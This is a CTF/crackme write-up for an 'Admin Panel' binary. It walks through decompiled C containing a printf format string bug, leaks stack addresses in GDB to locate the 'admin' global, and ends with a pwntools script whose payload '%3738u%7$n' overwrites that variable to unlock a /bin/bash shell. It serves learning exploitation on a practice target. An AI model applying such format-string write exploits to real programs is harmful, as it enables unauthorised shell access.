# Admin Panel

This challenge is a bit different from the regular crackmes. This challenge is essentially just a binary exploitation challenge, in this challenge we are tasked to exploit a format string vulnerability in the program to overwrite the value of a specific variable. After arbitrarily writing to the variable the program should make a call to system with the argument being `/bin/bash` Giving us a shell.

## Code Analysis - Reversing

```c

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[16]; // [rsp+10h] [rbp-120h] BYREF
  char s[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 canary; // [rsp+128h] [rbp-8h]

  canary = __readfsqword(0x28u);
  strcpy(dest, (const char *)&admin);
  puts("Welcome to the admin panel! The program which admins can\ninteract with on a guest computer to do admin stuff!\n");
  while ( 1 )
  {
    if ( admin != 3738 )
      puts("status: (admin=false; shell=unavailable)\n");
    if ( admin == 3738 )
      puts("status: (admin=true; shell=available)\n");
    printf("*> ");
    if ( !fgets(s, 256, stdin) )
      break;
    strtok(s, "\n");
    if ( !strcmp(s, "shell") && admin == 3738 )
    {
      system("/bin/bash");
    }
    else
    {
      printf("input: ");
      printf(s);
      puts("\n");
    }
  }
  return 0;

```

Here we can see that if the global variable `admin` equals `3738` and our input equals `shell` We pass all the checks and get a shell, pretty straight forward.

## Vulnerability Discovery

At first this looks impossible because we don't have any control over the `admin` variable, how can we make it equal to some value? If we carefully examine the code we can quickly see that there is a format string vulnerability present in the code `printf(s);` We control the `s` variable and therefore we can leak values of the stack and most importantly write arbritrary values to memory with the `%n` specifier.

# Exploitation

Now that we have an exploit strategy in mind we can go experiment with GDB. Let's fire up the binary in GDB and try to leak some stack addresses, when the program prompts for an input we give it a C format specifier for example: `%p`. This tells printf to print the address (pointer) to a value/variable on the stack.

```
Welcome to the admin panel! The program which admins can
interact with on a guest computer to do admin stuff!

status: (admin=false; shell=unavailable)

*> %p%p%p%p%p%p%p%p
input: 0x75706e69(nil)(nil)0x5555555560d00x7(nil)0x55555555807c(nil)

status: (admin=false; shell=unavailable)
```

This is exactly what we were expecting to see. Let's inspect some of these addresses to see where they point to

```
gef➤  x/x 0x75706e69
0x75706e69:	Cannot access memory at address 0x75706e69
gef➤  x/x 0x5555555560d00x7
Invalid number "0x5555555560d00x7".
gef➤  x/x 0x55555555807c
0x55555555807c <admin>:	0x00000000
gef➤  
```
Here we see that the address `0x55555555807c` is our `admin` variable. Now we have all the pieces to the puzzle and we can start building out our exploit, we know that the admin variable needs to be equal to the value `3738` and then our input has to be `shell` to get the program to call `system('/bin/bash')'. Let's use the format string vulnerability to write our desired value to memory.

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process('./admin_panel')
p.sendline(b"%3738u%7$n")
p.sendline(b"shell")
p.interactive()
```

- %3738u = our desired value as an unsigned int (u)
- %7$n = Write our value at the 7th position in memory (the 7th address is the admin variable)
